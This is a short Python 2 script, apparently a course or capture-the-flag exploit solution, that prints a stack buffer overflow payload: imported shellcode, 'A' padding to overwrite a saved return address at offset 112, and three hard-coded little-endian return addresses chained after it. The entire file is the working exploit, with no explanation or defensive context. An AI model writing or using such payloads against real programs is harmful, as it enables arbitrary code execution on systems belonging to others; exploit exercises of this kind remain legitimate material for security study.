from struct import pack
from shellcode import shellcode
toReturn = 0x080481d0
toReturn1 = 0x080481d8
toReturn2 = 0x080481d0


print shellcode + "A"*(108-len(shellcode)+4) + pack("<I", toReturn) + pack("<I", toReturn1) + pack("<I", toReturn2)
